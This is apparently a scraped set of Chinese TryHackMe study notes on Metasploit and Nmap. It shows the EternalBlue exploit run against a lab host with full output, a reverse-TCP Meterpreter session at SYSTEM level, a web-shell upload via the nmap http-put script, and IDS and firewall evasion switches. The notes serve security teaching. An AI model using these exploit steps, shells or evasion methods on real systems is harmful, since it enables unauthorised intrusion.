您可以使用setg命令来设置将用于所有模块的值。setg命令的用途与set命令类似。不同之处在于，如果您使用set命令使用一个模块设置一个值，然后切换到另一个模块，则需要再次设置该值。setg命令允许您设置该值，以便在默认情况下跨不同模块使用该值。您可以使用unsetg清除setg中的任何值集。 下面的示例使用以下流程; 我们使用ms17_010_eternalblue可利用 我们使用setg命令而不是set命令来设置RHOSTS变量 我们使用back命令来离开漏洞利用上下文 我们使用一个辅助工具(该模块是一个扫描程序，用于发现MS17-010漏洞) show options命令显示RHOSTS参数已经被目标系统的IP地址填充。 Navigating modules msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; setg rhosts 10.10.165.39 rhosts =&gt; 10.10.165.39 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; back msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options Module options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 10.10.165.39 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; setg命令设置一个全局值，直到退出Metasploit或使用unsetg命令清除它为止。 使用模块 一旦设置了所有模块参数，就可以使用exploit命令启动模块。Metasploit还支持run命令，这是为exploit命令创建的别名，因为在使用非exploit模块(端口扫描器、漏洞扫描器等)时，单词exploit没有意义。 可以不带任何参数或使用“-z”参数使用exploit命令。 exploit -z命令将在会话打开后立即运行该漏洞并后台运行该会话。 The exploit -z command msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit -z [*] Started reverse TCP handler on 10.10.44.70:4444 [*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.12.229:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.12.229:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.12.229:445 - Connecting to target for exploitation. [+] 10.10.12.229:445 - Connection established for exploitation. [+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes) [*] 10.10.12.229:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.12.229:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.12.229:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.12.229:445 - Sending all but last fragment of exploit packet [*] 10.10.12.229:445 - Starting non-paged pool grooming [+] 10.10.12.229:445 - Sending SMBv2 buffers [+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.12.229:445 - Sending final SMBv2 buffers. [*] 10.10.12.229:445 - Sending last fragment of exploit packet! [*] 10.10.12.229:445 - Receiving response from exploit packet [+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.12.229:445 - Sending egg to corrupted connection. [*] 10.10.12.229:445 - Triggering free of corrupted buffer. [*] Sending stage (201283 bytes) to 10.10.12.229 [*] Meterpreter session 2 opened (10.10.44.70:4444 -&gt; 10.10.12.229:49186) at 2021-08-20 02:06:48 +0100 [+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [*] Session 2 created in the background. msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 这将返回上下文提示符，您可以从中运行漏洞利用程序。 有些模块支持check选项。这将检查目标系统是否易受攻击而不加以利用。 会话 一旦漏洞被成功利用，就会创建一个会话。这是目标系统与Metasploit之间建立的通信通道。 您可以使用后台命令来后台会话提示符并返回到msfconsole提示符。 Backgrounding sessions meterpreter &gt; background [*] Backgrounding session 2... msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 或者，CTRL+Z可以用于后台会话。 可以从msfconsole提示符或任何上下文中使用sessions命令来查看现有会话。 Listing active sessions msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.10.44.70:4444 -&gt; 10.10.12.229:49163 (10.10.12.229) 2 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.10.44.70:4444 -&gt; 10.10.12.229:49186 (10.10.12.229) msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; back msf6 &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.10.44.70:4444 -&gt; 10.10.12.229:49163 (10.10.12.229) 2 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.10.44.70:4444 -&gt; 10.10.12.229:49186 (10.10.12.229) msf6 &gt; 要与任何会话交互，可以使用sessions -i命令和所需的会话号。 Interacting with sessions msf6 &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.10.44.70:4444 -&gt; 10.10.12.229:49163 (10.10.12.229) 2 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.10.44.70:4444 -&gt; 10.10.12.229:49186 (10.10.12.229) msf6 &gt; sessions -i 2 [*] Starting interaction with 2... meterpreter &gt; 5.总结 正如我们目前所看到的，Metasploit是一个强大的工具，可以促进开发过程。开发过程包括三个主要步骤;查找漏洞，定制漏洞，并利用易受攻击的服务。 Metasploit提供了许多模块，可以用于开发过程的每个步骤。通过这个房间，我们看到了Metasploit的基本组件和它们各自的用法。 最好还使用了ms17_010_eternalblue漏洞来访问目标VM。 在接下来的房间里，我们将更详细地介绍Metasploit及其组件。一旦完成，这个模块应该会让您对Metasploit的功能有一个很好的理解。 ","link":"https://f9f.fun/post/tryhackme-metasploit-introduction/"},{"title":" Tryhackme-Nmap 学习","content":"Tryhackme-Nmap 学习 1.介绍 当涉及到黑客时，知识就是力量。您对目标系统或网络了解得越多，可用的选项就越多。这使得在进行任何利用尝试之前必须执行适当的枚举。 假设我们得到了一个 IP（或多个 IP 地址）来执行安全审计。在我们做任何其他事情之前，我们需要了解我们正在攻击的“景观”。这意味着我们需要确定哪些服务正在目标上运行。例如，也许其中一个正在运行Web服务器，另一个充当Windows Active Directory域控制器。建立这张景观“地图”的第一阶段是所谓的港口扫描。当计算机运行网络服务时，它会打开一个称为“端口”的网络构造来接收连接。端口是发出多个网络请求或提供多个服务所必需的。例如，当您在 Web 浏览器中一次加载多个网页时，程序必须具有某种方式来确定哪个选项卡正在加载哪个网页。这是通过使用本地计算机上的不同端口与远程 Web 服务器建立连接来完成的。同样，如果您希望服务器能够运行多个服务（例如，也许您希望您的Web服务器同时运行站点的HTTP和HTTPS版本），那么您需要某种方式将流量定向到适当的服务。再一次，端口是解决这个问题的方法。网络连接在两个端口之间建立 - 一个在服务器上侦听的开放端口和一个在您自己的计算机上随机选择的端口。例如，当您连接到网页时，您的计算机可能会打开端口 49534 以连接到服务器的端口 443。 与前面的示例一样，该图显示了同时连接到多个网站时发生的情况。您的计算机会打开一个不同的高编号端口（随机），该端口用于与远程服务器的所有通信。 每台计算机共有 65535 个可用端口;但是，其中许多已注册为标准端口。例如，HTTP Web 服务几乎总是可以在服务器的端口 80 上找到。HTTPS Web 服务可以在端口 443 上找到。Windows NETBIOS可以在端口139上找到，SMB可以在端口445上找到。重要的是要注意;但是，尤其是在 CTF 设置中，甚至更改这些标准端口也并非闻所未闻，这使得我们对目标执行适当的枚举变得更加必要。 如果我们不知道服务器打开了哪些端口，那么我们就没有成功攻击目标的希望;因此，从端口扫描开始任何攻击至关重要。这可以通过多种方式实现 - 通常使用称为nmap的工具，这是这个房间的重点。Nmap 可用于执行许多不同类型的端口扫描——其中最常见的将在即将到来的任务中引入;但是，基本理论是这样的：nmap 将依次连接到目标的每个端口。根据端口的响应方式，可以将其确定为打开、关闭或过滤（通常由防火墙）。一旦我们知道哪些端口是打开的，我们就可以查看枚举每个端口上运行的服务 - 手动或更常用使用 nmap。 那么，为什么是nmap？简短的回答是，它目前是行业标准是有原因的：没有其他端口扫描工具可以匹配它的功能（尽管一些新手现在在速度方面匹配它）。这是一个非常强大的工具 - 通过其脚本引擎变得更加强大，可用于扫描漏洞，在某些情况下甚至直接执行漏洞利用！同样，这将在即将到来的任务中详细介绍。 问题 1.哪些网络构造用于将流量定向到服务器上的正确应用程序？ 端口 ports 2.在任何支持网络的计算机上，其中有多少个可用？ 65535 3.[研究]**其中有多少被认为是“知名”的？（这些是任务中提到的“标准”数字） 1024 2.nmap交换机 像大多数渗透测试工具一样，nmap 是从终端运行的。有适用于Windows和Linux的版本。对于这个房间，我们将假设您使用的是Linux;但是，开关应相同。Nmap默认安装在Kali Linux和TryHackMe攻击盒中。 Nmap可以通过在终端命令行中键入来访问，然后是一些“开关”（告诉程序做不同事情的命令参数），我们将在下面介绍。nmap 您所需要的只是 nmap 的帮助菜单（使用 ） 和/或 nmap 手册页（使用 ） 访问）。对于每个答案，除非另有说明，否则请包括交换机的所有部分。这包括开头的连字符 （）。nmap -h``man nmap``- 问题 ‘What is the first switch listed in the help menu for a ‘Syn Scan’ (more on this later!)?’ -sS ‘Which switch would you use for a “UDP scan”?’ -sU ‘If you wanted to detect which operating system the target is running on, which switch would you use?’ -O ‘Nmap provides a switch to detect the version of the services running on the target. What is this switch?’ -sV ‘The default output provided by nmap often does not provide enough information for a pentester. How would you increase the verbosity?’ -v ‘Verbosity level one is good, but verbosity level two is better! How would you set the verbosity level to two? (Note: it’s highly advisable to always use at least this option)’ -vv ‘What switch would you use to save the nmap results in three major formats?’ -oA ‘What switch would you use to save the nmap results in a “normal” format?’ -oN ‘A very useful output format: how would you save results in a “grepable” format?’ -oG ‘How would you activate this setting?’ -A ‘How would you set the timing template to level 5?’ -T5 ‘How would you tell nmap to only scan port 80?’ -p 80 ‘How would you tell nmap to scan ports 1000-1500?’ -p 1000-1500 ‘How would you tell nmap to scan all ports?’ -p- ‘How would you activate a script from the nmap scripting library (lots more on this later!)?’ --script ‘How would you activate all of the scripts in the “vuln” category?’ --script=vuln 3.概述 使用 Nmap 进行端口扫描时，有三种基本的扫描类型。这些是： 技术合作计划（TCP连接扫描 （-sT) SYN“半打开”扫描 （-sS) UDP扫描 （-sU) 此外，还有几种不太常见的端口扫描类型，我们还将介绍其中一些（尽管不太详细）。这些是： 技术合作计划（TCP空扫描 （-sN) 技术合作计划（TCPFIN 扫描 （-sF) 技术合作计划（TCP圣诞节扫描 （-sX) 其中大多数（UDP 扫描除外）用于非常相似的目的，但是，它们的工作方式在每次扫描之间有所不同。这意味着，虽然在大多数情况下，前三次扫描之一可能是您的首选，但值得记住的是，存在其他扫描类型。 在网络扫描方面，我们还将简要介绍ICMP（或“ping”）扫描。 4.TCP连接扫描 要了解Nmap中的TCP连接扫描（-sT），我们就必须先熟悉TCP三次握手过程。 我们简单描述一下TCP三次握手（共包括三个阶段）： 首先，客户端将发送一个设置了SYN标志位的TCP请求消息到目标服务器；然后，服务器端会用一个包含SYN标志位和ACK标志位的TCP响应消息来确认客户端所发送的请求数据包；最后，客户端将再次发送一个设置了ACK标志位的TCP请求消息来完成整个TCP握手过程。 TCP三次握手是TCP/IP网络的基本原则之一，但它与Nmap有什么关系呢? 顾名思义，Nmap中的TCP连接扫描的工作原理就是：通过依次与每个目标端口进行TCP三次握手来确认端口状态。也就是说，在TCP连接扫描中，Nmap将会尝试连接到每个指定的TCP端口，然后通过本地机所接收到的响应消息来确定目标端口是否打开。 如果一个TCP端口是关闭的，那么按照 RFC 793 协议文档的规定： “如果连接不存在（CLOSED），那么任何到达的数据段（除了reset）都会触发reset，特别地，这种方式可以拒绝到达一个不存在的连接的SYN。” 换句话说，如果Nmap发送一个设置了SYN标志的TCP请求消息到一个关闭端口，那么目标服务器将响应一个设置了RST (Reset)标志的TCP数据包，通过此响应消息，Nmap就可以确定目标端口已关闭。 但是，如果TCP请求消息被发送到一个开放端口，目标服务器将会响应一个设置了SYN/ACK标志位的TCP数据包，然后Nmap会将此端口标记为打开状态(并会通过发送一个带有ACK标志位的TCP数据包来完成握手)。 然而，在TCP连接扫描中还有第三种可能结果：如果目标端口是开放的，但此端口隐藏在防火墙后面。 有很多防火墙可能会被配置为简单地丢弃传入数据包，如果Nmap发送一个TCP SYN请求，但没有收到任何回复消息，这表示目标端口正在受到防火墙的保护，因此该端口会被Nmap认为是过滤的（filtered）。 配置防火墙以一个设置了RST标志的TCP数据包作为响应是非常容易的，例如，在Linux的IPtables中，我们可以使用如下命令配置防火墙（此配置会让Nmap难以探测目标端口的实际状态）： iptables -I INPUT -p tcp --dport &lt;port&gt; -j REJECT --reject-with tcp-reset tips：TCP连接扫描一般不推荐使用，因为会留下TCP连接日志。 问题 5.SYN扫描 与TCP扫描一样，SYN扫描(-sS)可用于扫描一个或多个目标的TCP端口范围；然而，这两种扫描类型的工作方式略有不同。 SYN扫描也被称为“半开-Half-open”扫描或“隐形-Stealth”扫描。 SYN扫描执行的是不完整的TCP三次握手过程，在SYN扫描中，客户端在接收到来自服务器的一个设置了SYN/ACK标志位的数据包之后，将直接发送一个设置了RST标志位的TCP数据包(这可以防止服务器端重复尝试发出TCP数据包)。 SYN扫描对开放的目标端口的探测过程如下所示： SYN扫描有很多好处： SYN扫描可以用来绕过一些旧的入侵检测系统（IDS），因为那些使用旧技术的IDS所检测的是完整的TCP三次握手，而现代IDS解决方案通常不再只是检测完整的TCP三次握手；正是基于前述原因，SYN扫描现在仍然会被称为“隐形-Stealth”扫描。 侦听开放端口的web应用程序通常不会记录SYN扫描行为，因为一个标准的web日志是在TCP连接完全建立后才开始记录，这再次说明了SYN扫描是隐秘的。 使用SYN扫描时，本地计算机无需针对每个目标端口完成TCP三次握手（以及最后断开连接）的全过程，因此，SYN扫描比标准的TCP连接扫描要快得多。 SYN扫描也有一些缺点： SYN扫描需要使用sudo权限才能在Linux中正常工作，这是因为SYN扫描需要创建原始数据包，在默认情况下，这是root用户才能拥有的特权。 不稳定的服务有时会因SYN扫描而宕机，如果客户提供给渗透测试人员的是处于生产环境下的目标机器，则可能会出现一些重大问题。 总而言之，使用Nmap中的SYN扫描是利大于弊的。 因此，如果用户具有sudo权限，则SYN扫描会是Nmap所使用的默认扫描；如果运行Nmap时没有sudo权限，那么Nmap的默认扫描类型为TCP连接扫描。 当使用SYN扫描来识别关闭状态和过滤状态的目标端口时，会应用与TCP连接扫描完全相同的规则（见上一小节内容）。 如果目标端口是关闭状态，则服务器会响应一个设置了RST标志位的TCP数据包；如果目标端口被防火墙过滤，那么客户端所发送的包含了SYN标志位的TCP数据包要么被直接丢弃，要么被TCP重置（reset）消息所欺骗。 SYN扫描与TCP连接扫描的最大不同在于：如何处理开放的目标端口。 6.UDP扫描 与TCP连接不同，UDP连接是无状态的。UDP连接只是简单地将数据包发往目标端口，并希望数据包能够成功到达，即：UDP并非是通过“握手”来启动连接的。 UDP适用于追求传输速度而不是数据传输质量的网络连接(例如视频共享过程)，但是，缺乏数据包确认响应也使得UDP扫描更加困难(而且更慢)；在Nmap中，UDP扫描的参数开关为-sU。 当一个数据包被发送到一个开放的UDP端口时：理论上应该不会有响应消息，此时Nmap会将该端口识别为open|filtered状态（UDP扫描会猜测目标UDP端口是开放的，但该目标端口也可能是被防火墙过滤的）；如果客户端得到一个UDP响应消息(这是非常不寻常的)，那么Nmap会将目标UDP端口识别为开放状态；常见的情况是客户端不会得到任何响应消息，在此情况下，数据包请求将会被第二次发送给目标UDP端口以进行双重检查，如果第二次发送数据包仍然没有得到响应，那么目标UDP端口就会被识别为open|filtered状态，然后Nmap将继续扫描下一个目标UDP端口。 当一个数据包被发送到一个关闭的UDP端口时：目标服务器应该响应一个ICMP (ping)数据包，其中会包含一个&quot;端口不可达&quot;的消息，Nmap会清楚地识别到这个UDP端口是关闭状态，然后Nmap将继续扫描下一个目标UDP端口。 由于很难识别UDP端口是否实际开放，所以与其他各种基于TCP的扫描相比，UDP扫描往往非常慢(在连接良好的情况下，仍可能要20分钟才能扫描完前1000个端口)；基于前述原因，在运行UDP扫描时，通常可以启用--top-ports &lt;number&gt;，例如，我们可以使用nmap -sU ——top-ports 20 &lt;target&gt;扫描前20个最常用的UDP端口，这样就能够获得一个更可接受的扫描时间。 当扫描不常用的UDP端口时，Nmap通常会发送完全空的请求——发送原始UDP数据包；对于通常由知名服务所占用的UDP端口（常用UDP端口），Nmap将转而发送特定于协议的数据包（比如53端口是运行dns服务的标准UDP端口，在对53端口进行探测时，Nmap会发送dns数据包），这更有可能得到目标的响应，从而能得出更准确的结果。 7.NULL, FIN和Xmas扫描 NULL, FIN和Xmas扫描并不是很常用的扫描类型（这三种扫描类型都是基于TCP的），所以我们在此仅作简单介绍；这三种扫描是相互关联的，它们往往比SYN隐形扫描更加隐蔽。 TCP Null扫描 顾名思义，NULL扫描（-sN）在发送TCP请求时不会设置任何标志位，根据RFC文档的说法，如果此时目标端口是关闭的，那么目标主机应该响应一个设置了RST标志的数据包。 TCP FIN扫描 FIN扫描(-sF)的工作方式与NULL扫描几乎相同，但是，FIN扫描不会发送一个完全空的数据包，而是发送一个带有FIN标志的数据包(FIN标志可用于关闭正在活动的TCP连接)；同样，如果此时目标端口是关闭状态，Nmap会期望得到一个设置了RST标志的数据包响应。 TCP Xmas扫描 与NULL扫描、FIN扫描类似，Xmas扫描(-sX)会发送一个格式错误的TCP数据包，如果此时目标端口是关闭状态，Nmap会期望得到一个设置了RST标志的响应数据包。 Xmas扫描被称为圣诞（xmas的含义为圣诞）扫描，因为Xmas扫描所发送的TCP数据包设置了PSH标志、URG标志和FIN标志，当我们使用Wireshark进行数据包捕获时——相关的捕获结果看起来就像一棵闪烁的圣诞树。 使用以上三种扫描方式来探测一个开放端口，那么预期可得到的响应情况是相同的——如果目标端口是开放的，则目标端口不会对以上三种扫描所发送的畸形数据包进行响应；不幸的是(就像开放的UDP端口一样)，目标端口还可能正被防火墙所保护(这也是一种预期的情况)，因此，NULL, FIN和Xmas扫描往往会将目标端口识别为open|filtered(开放|过滤)状态、closed(关闭)状态或者filtered(过滤)状态；如果一个端口被以上三种扫描之一识别为filtered(过滤)状态，那么通常是因为目标已经响应了一个ICMP不可达数据包。 值得注意的是，虽然RFC 793要求目标主机对发送到&quot;关闭的目标端口&quot;的畸形数据包 以一个设置了RST标志的数据包作为响应，而对发送到&quot;开放的目标端口&quot;的畸形数据包，目标主机将完全不作出响应；但是实际情况并非总是如此，特别是Microsoft Windows以及许多Cisco网络设备，它们可能会对接收到的任何畸形数据包 都以一个设置了RST标志的数据包作为响应（而不管端口是否实际打开），这将导致所有目标端口都会被Nmap识别为关闭状态。 使用Nmap中的NULL, FIN和Xmas扫描，还可以实现“防火墙规避”操作。许多防火墙会被配置为：将设置了SYN标志的传入TCP数据包丢弃，并阻塞目标端口(从而阻塞新的连接启动请求)；但是，我们可以通过发送不包含SYN标志的请求数据包来尝试绕过防火墙规则。虽然以上三个Nmap扫描类型 在理论上都能够实现绕过防火墙，但大多数现代IDS解决方案能够识别出NULL, FIN和Xmas扫描，因此在使用Nmap对现代目标系统进行探测时，我们不要希望端口扫描的结果会是100%有效。 8.ICMP网络扫描 当我们在黑盒渗透测试任务中第一次连接到目标网络时，我们首先应该尝试获得当前网络结构的“map”——换句话说，我们希望看到哪些IP地址范围包含了活动主机，哪些IP地址范围不包含活动主机。 为了探测目标主机存活情况，我们可以使用Nmap执行 ICMP 网络扫描（也就是ping扫描），在ping扫描中，Nmap会向指定网络范围内的每个IP地址发送 ICMP 报文，当接收到响应时，Nmap则会将发出响应的IP地址标记为活动主机。执行ping扫描得到的结果并不总是准确的，但是它仍然可以提供一些参考信息。 如果我们要执行ping扫描，则需要将Nmap的-sn参数开关与IP地址范围结合使用，IP地址范围可以使用连字符(-)或CIDR表示法指定。 CIDR格式 组成：网络地址/子网掩码 使用格式：IP/掩码长度（192.168.1.0/24），主机名/掩码长度( baidu.com/24 ) 例如，当我们扫描192.168.0.x网络时，可以使用： nmap -sn 192.168.0.1-254 nmap -sn 192.168.0.0/24 -sn参数开关会告诉Nmap不要扫描任何端口，迫使Nmap主要依靠发送ICMP echo 请求数据包来识别存活的主机；此外，如果使用sudo或作为root用户运行ping扫描，则将主要依赖于本地网络上的ARP请求来识别（本地以太网上的）存活主机。 除了ICMP echo 请求外：-sn参数开关还会让Nmap发送一个TCP SYN数据包到目标机的443端口；以及让Nmap发送一个TCP ACK数据包(如果是非root用户执行扫描，则此处是发送TCP SYN数据包)到目标机的80端口；还有让Nmap发送一个ICMP时间戳请求到目标机。 在Ping扫描中，如何确认目标主机在线： 当ping扫描发送TCP ACK报文到目标机80端口时，存活主机可能会以TCP RST报文作为响应； 当ping扫描发送ICMP echo 请求到目标机时，存活主机可能会作出一个正常的Ping应答（CMP Echo reply）； 当ping扫描发送ICMP时间戳请求到目标机时，存活主机可能会返回当前系统时间；(ICMP时间戳请求允许一个系统向另一个系统查询当前的时间，如果目标主机返回了时间，则说明目标主机是活动的) 当ping扫描发送TCP SYN报文到目标机的443端口时，存活主机可能会以TCP SYN+ACK报文或者RST报文作为响应。 tips：使用-sn参数开关的ping扫描会默认发送四种不同类型的数据包来探测目标主机是否在线，只要收到其中一个数据包的回复，那就证明目标机是开启的；使用四种不同类型的数据包可以避免因防火墙阻塞或丢包造成的探测错误。 9.NSE脚本概述 Nmap脚本引擎 (NSE-Nmap Scripting Engine)是对Nmap工具的一个非常强大的补充，它极大地扩展了Nmap的功能。NSE脚本是用Lua编程语言编写的，这些脚本可以用来做各种各样的事情：NSE可以用来扫描目标是否存在漏洞，并能自动利用这些可能存在的漏洞，NSE还有助于更好地进行信息收集，不管怎样，我们很有必要意识到Nmap脚本库的用途是多么广泛。 有很多NSE脚本种类可供我们选择，其中一些有用的NSE脚本分类包括： safe：安全性好的nmap脚本，使用时不会影响目标； intrusive：不够安全的nmap脚本，使用时可能影响目标； vuln：用于扫描漏洞的nmap脚本； exploit：能够试图进行漏洞利用的nmap脚本； auth：此类nmap脚本，会试图绕过正在运行的服务的身份验证(例如，匿名登录到FTP服务器)； brute：此类nmap脚本，将试图强行验证正在运行的服务的凭据； discovery：此类nmap脚本，将尝试查询正在运行的服务以获得有关目标网络的进一步信息(例如查询SNMP服务器，SNMP即&quot;简单网络管理协议&quot;)。 访问以下链接，可以找到一个更详尽的NSE脚本列表： https://nmap.org/book/nse-usage.html 在下一个小节中，我们将研究如何与NSE交互，并使用以上这些类别中的NSE脚本。 10.NSE脚本-使用NSE脚本 我们可以在Nmap中使用--script参数开关来激活vuln分类的NSE脚本：--script=vuln。其他类别的NSE脚本也是通过一样的语法激活，例如，我们可以使用--script=safe激活安全类型的脚本并使其针对目标运行（注意：只有当脚本的目标为一个活动着的服务，脚本才能实际生效）。 如果我们想要执行特定的NSE脚本，可以使用--script=&lt;script-name&gt;格式的命令，例如--script=http-fileupload-exploiter；如果想同时执行多个脚本，则需要使用逗号隔开，例如--script=smb-enum-users,smb-enum-shares。 有些NSE脚本还需要我们提供参数(例如，使用需要经过身份验证的漏洞利用脚本，需要我们提供凭据)，这些参数可以通过--script-args参数开关来指定；一个例子是http-put脚本（尝试通过使用PUT方法上传文件），它需要我们提供两个参数——文件的目的地URL以及文件在磁盘上的位置，实际的命令可能如下所示： nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' 注意：以上示例命令中的脚本参数将以逗号分隔，并需要使用英文句点符号来连接到相应的脚本（即 &lt;script-name&gt;.&lt;argument&gt;，如“http-put.url”）。 通过以下链接，我们可以看到关于NSE脚本及其相应参数的完整列表：https://nmap.org/nsedoc/ Nmap脚本还带有内置的帮助菜单，我们可以通过使用nmap --script-help &lt;script-name&gt;来访问。 访问 https://nmap.org/search/ ，并在线搜索脚本名称，我们可以找到NSE脚本相关的可用参数： ftp-anon.nse脚本可用于检测是否允许FTP 匿名登录，该脚本有一个可设置的参数maxlist，用于列出扫到开放ftp端口时最多列出的文件列表的数量。 11.NSE脚本-搜索脚本 我们已经了解了如何使用Nmap中的脚本，但我们现在还不知道如何找到这些NSE脚本。 我们有两种选择(理想情况下应该结合使用)可以找到NSE脚本：第一个选择是使用Nmap官方网站上的页面，其中包含了所有Nmap脚本的列表；第二个选择是Kali Linux机器上的Nmap本地存储信息。Nmap会将其脚本存储在Linux上的/usr/share/nmap/scripts目录下（在默认情况下），所有NSE脚本都会存储在这个目录中——当你使用Nmap命令指定脚本时，Nmap就会在NSE脚本存储目录中进行查找。 在安装了Nmap的本地机器上，我们可以使用/usr/share/nmap/scripts/script.db文件来搜索已经安装的NSE脚本，尽管有.db扩展名，但script.db实际上并不是一个数据库文件，而是一个包含每个可用脚本的文件名和类别的格式化文本文件。 Nmap可以使用script.db文件来跟踪(并利用)其脚本引擎中的脚本，但是，我们也可以通过grep来查找NSE脚本，例如： grep &quot;ftp&quot; /usr/share/nmap/scripts/script.db 我们还可以使用ls命令来搜索脚本，例如： ls -l /usr/share/nmap/scripts/*ftp* #注意在搜索词的两边使用星号(*)通配符 同样的方法也可以用于搜索Nmap的脚本类别，例如： grep &quot;safe&quot; /usr/share/nmap/scripts/script.db 安装新脚本 我们之前提到过，Nmap官方网站中有一个包含所有NSE脚本的列表，那么，如果在本地机器的Nmap脚本目录中缺少了其中一个NSE脚本应该怎么办？ 我们使用标准的更新和安装命令sudo apt update &amp;&amp; sudo apt install nmap应该能修复本地机的NSE脚本缺失问题，但是，我们也可以通过从Nmap官网中下载NSE文件并手动安装NSE脚本： sudo wget -O /usr/share/nmap/scripts/&lt;script-name&gt;.nse https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse 在成功下载并安装缺失的NSE脚本之后，我们必须接着执行nmap --script-updatedb命令，这可以更新本地机中的script.db文件 以包含新下载的NSE脚本。 值得注意的是，如果你要制作自己的NSE脚本并将其添加到Nmap中，你最终也需要使用“updatedb”命令——并且你还需要具有Lua基础知识，以完成自制NSE脚本的编写。 答题 tips：使用本地Kali机进行操作并回答以下问题。 问题1：在/usr/share/nmap/scripts/目录中搜索“smb”脚本，用于确定SMB服务器的相关操作系统的脚本的文件名称为? 我们使用/usr/share/nmap/scripts/script.db文件来搜索和“smb”相关的脚本（并根据脚本文件的名称来猜测其作用）： grep &quot;smb&quot; /usr/share/nmap/scripts/script.db 问题2：通读问题1中的对应脚本内容，此脚本是基于什么? 我们在刚才的Lua脚本（smb-os-discovery.nse）的内容中查找dependencies = {}： grep &quot;dependencies&quot; /usr/share/nmap/scripts/smb-os-discovery.nse #可以直接使用&quot;cat smb-os-discovery.nse&quot;命令来通读脚本内容并寻找关键字 12.防火墙规避 我们已经知道了一些可应用于绕过防火墙的扫描方法(比如SYN扫描，以及NULL、FIN和Xmas扫描)，然而，还有一种非常常见的防火墙配置——阻止所有ICMP数据包，我们必须知道如何绕过这种防火墙规则。 典型的Windows主机会使用其默认防火墙阻止所有ICMP数据包，这就产生了一些问题：我们经常会使用ping命令(通过发送ICMP数据包)来手动探测目标是否存活，Nmap在执行某些扫描时，也会默认发送ICMP数据包。这就意味着，Nmap会将使用了“阻塞所有ICMP数据包”的防火墙配置的机器 识别为不活动的主机，并且根本不会扫描它。 所以我们需要一种方法来绕过这种防火墙配置（指阻止所有ICMP数据包），幸运的是，Nmap为此提供了一个参数开关：-Pn，此参数开关会告诉Nmap在扫描主机之前不要执行ping检测；使用-Pn意味着Nmap将始终将目标主机视为存活的，这样能够有效地绕过ICMP阻塞，然而代价是可能需要很长时间来完成扫描(即使目标主机真的不活动，Nmap仍然会检查和重复检查每个指定的端口)。 值得注意的是，如果你已经处于目标所在的本地网络上，Nmap还会使用ARP请求来确定目标主机是否存活。 Nmap中还有许多其他参数开关对防火墙规避很有用，我们在此不作详细讨论，你可以访问以下链接地址： https://nmap.org/book/man-bypass-firewalls-ids.html 以下Nmap参数开关是值得注意的： -f：用于分割数据包(将它们分成更小的数据片段)，从而使数据包不太可能被防火墙或IDS(入侵检测系统)检测到。 --mtu &lt;number&gt;：是-f的替代选项，但是能更好地控制数据包的大小，它可以设置用于发送的数据包的最大传输单元大小，这一定是8的倍数。 --scan-delay &lt;time&gt;ms：用于增加数据包发送之间的延迟时间；在网络不稳定的时候，这非常有用，而且还可以规避&quot;基于时间进行检测&quot;的防火墙/IDS触发器。 